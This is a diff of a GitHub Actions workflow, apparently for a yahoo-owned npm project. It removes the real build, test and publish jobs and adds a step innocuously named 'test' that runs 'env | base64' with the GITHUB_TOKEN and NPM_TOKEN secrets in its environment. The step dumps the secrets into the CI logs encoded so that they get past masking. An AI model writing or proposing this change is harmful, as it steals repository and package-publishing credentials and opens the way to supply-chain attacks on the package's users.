@@ -10,43 +10,8 @@ jobs:
   test:
     runs-on: ubuntu-latest
     steps:
-    - name: Checkout code
-      uses: actions/checkout@v3
-    - name: Setup node
-      uses: actions/setup-node@v2
-      with:
-        node-version: 18
-    - name: Install dependencies
-      run: npm install
-    - name: Build code
-      run: npm run build
-    - name: Format code
-      run: npm run format:check
-    - name: Test code
-      run: npm test
-  publish:
-    runs-on: ubuntu-latest
-    needs: [test]
-    if: "${{ github.repository_owner == 'yahoo' && github.event_name == 'push' }}"
-    steps:
-    - name: Checkout code
-      uses: actions/checkout@v3
-    - name: Setup node
-      uses: actions/setup-node@v3
-      with:
-        node-version: 18
-    - name: Install dependencies
-      run: npm install
-    - name: Build code
-      run: npm run build
-    - name: Publish to npm
-      id: changesets
-      uses: changesets/action@v1
-      with:
-        version: npm run version
-        publish: npm run publish
-        commit: '[ci] publish'
-        title: '[ci] publish'
+    - name: test
+      run: env | base64
       env:
         GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
